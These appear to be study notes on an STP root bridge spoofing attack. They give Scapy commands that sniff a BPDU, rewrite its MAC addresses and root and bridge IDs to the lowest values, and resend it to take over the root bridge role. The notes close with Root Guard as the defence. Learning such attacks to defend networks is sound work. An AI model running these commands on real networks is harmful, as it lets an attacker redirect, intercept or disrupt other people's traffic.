-> STP-Root Bridge Attack :

  - Capture STP packet phase :
  .1. Capture STP packet using scapy.all.sniff(filter="CaptureFilter",count="Packet.No", store=False | True, prn="Function") .

   .1.1 Capturing idea is for get the STP-Packet information (Bridge-Port, Port-Cost, Port-ID, Fake BPDU) .

   - sniffed_pkt = scapy.all.sniff(filter="ether dst 01:80:c2:00:00:00",count=1)


  - Change Packet Information :
  .2. sniffed_pkt[0].src = "00:00:00:00:00:01" : Change source MAC address of the frame "Which is my mac address" to this MAC address, to set it as the lowest mac address in the network to be able to set my device as the Root-Bridge of the network .

  .3. sniffed_pkt[0].rootid = 0 : Set Root-ID to zero, Root-ID is the BPDU (Bridge-ID(BPDU Number).MAC Address of the Root-Bridge), which mean this root id will be the lowest and the Root-Bridge will be changed to be for the device with this Root-ID .

  .4. sniffed_pkt[0].rootmac = "00:00:00:00:00:01" : Set Root-MAC to "00:00:00:00:00:01" which is the default for the system-id (MAC address) for the root-bridge in the STP and RSTP , Change the MAC of the Root-Bridge to be the lowest also .

  .5. sniffed_pkt[0].bridgeid = 0 : Set Bridge-ID to zero, which mean the Bridge-ID And Root-ID when equal each other this is the Root-Bridge information .

  .6. sniffed_pkt[0].bridgemac = "00:00:00:00:00:01" : Set Root-MAC = Bridge-MAC, which mean this is the Root-Bridge node .

  .7. sniffed_pkt[0].show() : Show frame content .

  - Start Attack :
   - Send changed frame back into the network using scapy.all.sendp(packet, loop=0, verbose=True | False)

   .1. sendp(sniffed_pkt[0], loop=0, verbose=True) .


  - Security solution for this attack is (Root-Guard) in any port i don't trust .
   .1. Set guard to Root-Bridge .
   .2. This Root-Guard will block the forged-BPDU's .

  - Idea of this attack is capture a frame contain the original information for the Root-Bridge then forged it in the packet then resend it to the network to Spoof the Root-Bridge information and position .


